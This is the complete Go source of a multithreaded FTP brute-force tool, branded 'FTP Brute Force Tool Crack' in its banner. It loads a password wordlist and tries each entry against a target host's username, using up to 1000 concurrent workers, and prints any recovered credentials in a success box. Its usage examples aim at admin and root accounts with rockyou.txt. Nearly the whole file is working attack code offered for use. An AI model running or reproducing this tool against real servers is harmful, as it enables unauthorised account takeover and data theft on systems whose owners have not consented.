package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/jlaffaye/ftp"
)

// ═══════════════════════════════════════════════════════════════
// ASCII ART BANNER
// ═══════════════════════════════════════════════════════════════
var banner = `
██████╗ ███████╗    ███████╗████████╗██████╗ 
██╔══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗
██████╔╝█████╗      █████╗     ██║   ██████╔╝
██╔══██╗██╔══╝      ██╔══╝     ██║   ██╔═══╝ 
██████╔╝██║         ██║        ██║   ██║     
╚═════╝ ╚═╝         ╚═╝        ╚═╝   ╚═╝     
FTP Brute Force Tool Crack Version 1.0.0
Authors: GhostGTT666 - Gagaltotal666
Github: github.com/gagaltotal/ftp-cracker-tot
`

var (
	version    = "1.0.0"
	green      = color.New(color.FgGreen, color.Bold).SprintFunc()
	red        = color.New(color.FgRed, color.Bold).SprintFunc()
	yellow     = color.New(color.FgYellow).SprintFunc()
	cyan       = color.New(color.FgCyan).SprintFunc()
	white      = color.New(color.FgWhite).SprintFunc()
	magenta    = color.New(color.FgMagenta).SprintFunc()
	greenBold  = color.New(color.FgGreen, color.Bold).SprintFunc()
	redBold    = color.New(color.FgRed, color.Bold).SprintFunc()
	yellowBold = color.New(color.FgYellow, color.Bold).SprintFunc()
)

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION STRUCT
// ═══════════════════════════════════════════════════════════════
type Config struct {
	Host     string
	Port     int
	User     string
	Passlist string
	Threads  int
	Timeout  int
	Verbose  bool
}

// ═══════════════════════════════════════════════════════════════
// RESULT STRUCT
// ═══════════════════════════════════════════════════════════════
type Result struct {
	Password string
	Found    bool
}

// ═══════════════════════════════════════════════════════════════
// MAIN FUNCTION
// ═══════════════════════════════════════════════════════════════
func main() {
	startTime := time.Now()

	config := parseArgs()

	printBanner()

	if err := validateConfig(config); err != nil {
		fmt.Println(red("[!] Validation Error:"), err)
		os.Exit(1)
	}

	printConfig(config)

	passwords, err := readPasslist(config.Passlist)
	if err != nil {
		fmt.Println(red(fmt.Sprintf("[!] Error reading passlist: %v", err)))
		os.Exit(1)
	}

	if len(passwords) == 0 {
		fmt.Println(red("[!] Password list is empty!"))
		os.Exit(1)
	}

	fmt.Println(green(fmt.Sprintf("[+] Loaded %d passwords from wordlist", len(passwords))))
	fmt.Println()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var tried atomic.Int64
	var failed atomic.Int64
	var found atomic.Bool

	passwordChan := make(chan string, len(passwords))
	resultChan := make(chan *Result, 1)

	stopProgress := make(chan struct{})

	var wg sync.WaitGroup

	setupSignalHandler(cancel, &wg, stopProgress)

	for _, pwd := range passwords {
		passwordChan <- pwd
	}
	close(passwordChan)

	go progressPrinter(&tried, &failed, int64(len(passwords)), stopProgress)

	workerPool := newWorkerPool(config, &tried, &failed, &found, resultChan)

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go workerPool.worker(ctx, &wg, passwordChan)
	}

	var result *Result
	select {
	case result = <-resultChan:
		cancel()
		shutdownRequested.Store(true)
		safeCloseProgress(stopProgress)
		wg.Wait()
		printSuccess(config, result.Password, startTime, tried.Load())

	case <-func() chan struct{} {
		done := make(chan struct{})
		go func() {
			wg.Wait()
			close(done)
		}()
		return done
	}():
		safeCloseProgress(stopProgress)
		if !found.Load() {
			printFailure(startTime, tried.Load())
		}
	}
}

// ═══════════════════════════════════════════════════════════════
// WORKER POOL STRUCT
// ═══════════════════════════════════════════════════════════════
type WorkerPool struct {
	config *Config
	tried  *atomic.Int64
	failed *atomic.Int64
	found  *atomic.Bool
	result chan<- *Result
}

func newWorkerPool(config *Config, tried, failed *atomic.Int64, found *atomic.Bool, result chan<- *Result) *WorkerPool {
	return &WorkerPool{
		config: config,
		tried:  tried,
		failed: failed,
		found:  found,
		result: result,
	}
}

func (wp *WorkerPool) worker(ctx context.Context, wg *sync.WaitGroup, passwords <-chan string) {
	defer wg.Done()

	for {
		if shutdownRequested.Load() {
			return
		}

		select {
		case <-ctx.Done():
			return

		case password, ok := <-passwords:
			if !ok {
				return
			}

			if shutdownRequested.Load() || wp.found.Load() {
				return
			}

			wp.tried.Add(1)

			success := wp.tryLoginWithContext(ctx, password)

			if shutdownRequested.Load() {
				return
			}

			if success {
				if wp.found.CompareAndSwap(false, true) {
					wp.result <- &Result{
						Password: password,
						Found:    true,
					}
				}
				return
			}
		}
	}
}

func (wp *WorkerPool) tryLoginWithContext(ctx context.Context, password string) bool {
	addr := fmt.Sprintf("%s:%d", wp.config.Host, wp.config.Port)
	timeout := time.Duration(wp.config.Timeout) * time.Second

	type loginResult struct {
		success bool
		err     error
	}
	resultChan := make(chan loginResult, 1)

	go func() {
		conn, err := ftp.Dial(addr, ftp.DialWithTimeout(timeout))
		if err != nil {
			resultChan <- loginResult{false, err}
			return
		}
		defer conn.Quit()

		err = conn.Login(wp.config.User, password)
		resultChan <- loginResult{err == nil, err}
	}()

	select {
	case <-ctx.Done():
		return false
	case result := <-resultChan:
		if result.err != nil && wp.config.Verbose {
			if !strings.Contains(result.err.Error(), "530") {
				fmt.Printf("%s Connection error: %v\n", yellow("[!]"), result.err)
			}
		}
		wp.failed.Add(0)
		return result.success
	case <-time.After(timeout + 2*time.Second):
		return false
	}
}

// ═══════════════════════════════════════════════════════════════
// PROGRESS PRINTER
// ═══════════════════════════════════════════════════════════════
func progressPrinter(tried, failed *atomic.Int64, total int64, stop <-chan struct{}) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			fmt.Println()
			return
		case <-ticker.C:
			if shutdownRequested.Load() {
				return
			}

			t := tried.Load()
			f := failed.Load()
			if t == 0 {
				continue
			}

			percentage := float64(t) / float64(total) * 100
			bar := createProgressBar(percentage)

			fmt.Printf("\r%s [%s] %d/%d (%.2f%%) | Errors: %d",
				cyan("[*]"),
				bar,
				t,
				total,
				percentage,
				f,
			)
		}
	}
}

func createProgressBar(percentage float64) string {
	width := 30
	filled := int(percentage / 100 * float64(width))

	bar := strings.Repeat("█", filled)
	bar += strings.Repeat("░", width-filled)

	return bar
}

// ═══════════════════════════════════════════════════════════════
// ARGUMENT PARSING
// ═══════════════════════════════════════════════════════════════
func parseArgs() *Config {
	config := &Config{}

	flag.StringVar(&config.Host, "host", "", "Target host or IP address")
	flag.StringVar(&config.Host, "H", "", "Target host or IP address (short)")
	flag.StringVar(&config.User, "user", "", "Username for FTP login")
	flag.StringVar(&config.User, "u", "", "Username for FTP login (short)")
	flag.StringVar(&config.Passlist, "passlist", "", "Path to password wordlist")
	flag.StringVar(&config.Passlist, "p", "", "Path to password wordlist (short)")
	flag.IntVar(&config.Threads, "threads", 30, "Number of concurrent threads")
	flag.IntVar(&config.Threads, "t", 30, "Number of concurrent threads (short)")
	flag.IntVar(&config.Port, "port", 21, "FTP port")
	flag.IntVar(&config.Port, "P", 21, "FTP port (short)")
	flag.IntVar(&config.Timeout, "timeout", 5, "Connection timeout in seconds")
	flag.BoolVar(&config.Verbose, "verbose", false, "Enable verbose output")
	flag.BoolVar(&config.Verbose, "v", false, "Enable verbose output (short)")

	flag.Usage = func() {
		fmt.Println(cyan(banner))
		fmt.Println(cyan("    FTP Brute Force Tool Crack " + version))
		fmt.Println(cyan("══════════════════════════════════════════════"))
		fmt.Println()
		fmt.Println(white("Usage:"))
		fmt.Println("  ftpcracker -host <target> -user <username> -passlist <wordlist> [options]")
		fmt.Println()
		fmt.Println(white("Options:"))
		flag.PrintDefaults()
		fmt.Println()
		fmt.Println(white("Examples:"))
		fmt.Println("  ftpcracker -host 192.168.1.1 -u admin -p wordlist.txt")
		fmt.Println("  ftpcracker -host 192.168.1.1 -user root -passlist rockyou.txt -t 50 -v")
		fmt.Println()
	}

	flag.Parse()

	return config
}

// ═══════════════════════════════════════════════════════════════
// VALIDATION
// ═══════════════════════════════════════════════════════════════
func validateConfig(config *Config) error {
	if config.Host == "" {
		return fmt.Errorf("host is required")
	}

	if config.User == "" {
		return fmt.Errorf("username is required")
	}

	if config.Passlist == "" {
		return fmt.Errorf("password list is required")
	}

	if config.Threads < 1 {
		return fmt.Errorf("threads must be at least 1")
	}

	if config.Threads > 1000 {
		return fmt.Errorf("threads cannot exceed 1000 (to prevent resource exhaustion)")
	}

	if config.Port < 1 || config.Port > 65535 {
		return fmt.Errorf("invalid port number")
	}

	if config.Timeout < 1 {
		return fmt.Errorf("timeout must be at least 1 second")
	}

	return nil
}

// ═══════════════════════════════════════════════════════════════
// FILE READING
// ═══════════════════════════════════════════════════════════════
func readPasslist(path string) ([]string, error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("file not found: %s", path)
	}

	file, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	buf := make([]byte, 0, 64*1024)
	scanner.Buffer(buf, 10*1024*1024)

	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())

		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		passwords = append(passwords, line)
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file at line %d: %w", lineNum, err)
	}

	return passwords, nil
}

// ═══════════════════════════════════════════════════════════════
// GLOBAL VARIABLES FOR GRACEFUL SHUTDOWN
// ═══════════════════════════════════════════════════════════════
var (
	shutdownRequested atomic.Bool
	closeProgressOnce sync.Once
)

// ═══════════════════════════════════════════════════════════════
// SAFE CLOSE PROGRESS FUNCTION
// ═══════════════════════════════════════════════════════════════
func safeCloseProgress(stopProgress chan struct{}) {
	closeProgressOnce.Do(func() {
		close(stopProgress)
	})
}

// ═══════════════════════════════════════════════════════════════
// SIGNAL HANDLER
// ═══════════════════════════════════════════════════════════════
func setupSignalHandler(cancel context.CancelFunc, wg *sync.WaitGroup, stopProgress chan struct{}) {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan

		if !shutdownRequested.CompareAndSwap(false, true) {
			fmt.Println(red("\n[!] Forced exit!"))
			os.Exit(1)
		}

		fmt.Println()
		fmt.Println(yellow("[!] Received interrupt signal (Ctrl+C)"))
		fmt.Println(yellow("[!] Shutting down gracefully..."))

		cancel()

		safeCloseProgress(stopProgress)

		done := make(chan struct{})
		go func() {
			wg.Wait()
			close(done)
		}()

		select {
		case <-done:
			fmt.Println(green("[+] All workers stopped gracefully"))
		case <-time.After(3 * time.Second):
			fmt.Println(red("[!] Timeout waiting for workers, forcing exit..."))
		}

		os.Exit(0)
	}()
}

// ═══════════════════════════════════════════════════════════════
// OUTPUT FUNCTIONS
// ═══════════════════════════════════════════════════════════════
func printBanner() {
	fmt.Println(cyan(banner))
	fmt.Println(cyan("    FTP Brute Force Tool Crack " + version))
	fmt.Println(cyan("══════════════════════════════════════════════"))
	fmt.Println()
}

func printConfig(config *Config) {
	fmt.Println(yellow("[*] Configuration:"))
	fmt.Printf("    %-12s %s\n", "Target:", magenta(config.Host))
	fmt.Printf("    %-12s %s\n", "Port:", magenta(config.Port))
	fmt.Printf("    %-12s %s\n", "Username:", magenta(config.User))
	fmt.Printf("    %-12s %s\n", "Wordlist:", magenta(config.Passlist))
	fmt.Printf("    %-12s %s\n", "Threads:", magenta(config.Threads))
	fmt.Printf("    %-12s %s seconds\n", "Timeout:", magenta(config.Timeout))
	fmt.Printf("    %-12s %v\n", "Verbose:", magenta(config.Verbose))
	fmt.Println()
}

func printSuccess(config *Config, password string, startTime time.Time, tried int64) {
	elapsed := time.Since(startTime)
	perSec := float64(tried) / elapsed.Seconds()

	fmt.Println()
	fmt.Println(green("╔══════════════════════════════════════════════════════════════╗"))
	fmt.Println(green("║                    SUCCESS! CREDENTIALS FOUND!               ║"))
	fmt.Println(green("╠══════════════════════════════════════════════════════════════╣"))
	fmt.Println(green("║") + "                                                              " + green("║"))
	fmt.Printf("%s║  Host:     %-46s%s\n", green(""), config.Host+":"+fmt.Sprint(config.Port), green("║"))
	fmt.Printf("%s║  User:     %-46s%s\n", green(""), config.User, green("║"))
	fmt.Printf("%s║  Password: %-46s%s\n", green(""), password, green("║"))
	fmt.Println(green("║") + "                                                              " + green("║"))
	fmt.Println(green("╠══════════════════════════════════════════════════════════════╣"))
	fmt.Printf("%s║  Time Elapsed:   %-41s%s\n", green(""), elapsed.Round(time.Millisecond).String(), green("║"))
	fmt.Printf("%s║  Passwords Tried: %-40d%s\n", green(""), tried, green("║"))
	fmt.Printf("%s║  Speed:          %-38.2f/s%s\n", green(""), perSec, green("║"))
	fmt.Println(green("╚══════════════════════════════════════════════════════════════╝"))
	fmt.Println()
}

func printFailure(startTime time.Time, tried int64) {
	elapsed := time.Since(startTime)
	perSec := float64(tried) / elapsed.Seconds()

	fmt.Println()
	fmt.Println(red("╔══════════════════════════════════════════════════════════════╗"))
	fmt.Println(red("║                    FAILED! PASSWORD NOT FOUND!               ║"))
	fmt.Println(red("╠══════════════════════════════════════════════════════════════╣"))
	fmt.Printf("%s║  Time Elapsed:   %-41s%s\n", red(""), elapsed.Round(time.Millisecond).String(), red("║"))
	fmt.Printf("%s║  Passwords Tried: %-40d%s\n", red(""), tried, red("║"))
	fmt.Printf("%s║  Speed:          %-38.2f/s%s\n", red(""), perSec, red("║"))
	fmt.Println(red("║                                                              ║"))
	fmt.Println(red("║  Tip: Try a different wordlist or check your username        ║"))
	fmt.Println(red("╚══════════════════════════════════════════════════════════════╝"))
	fmt.Println()
}
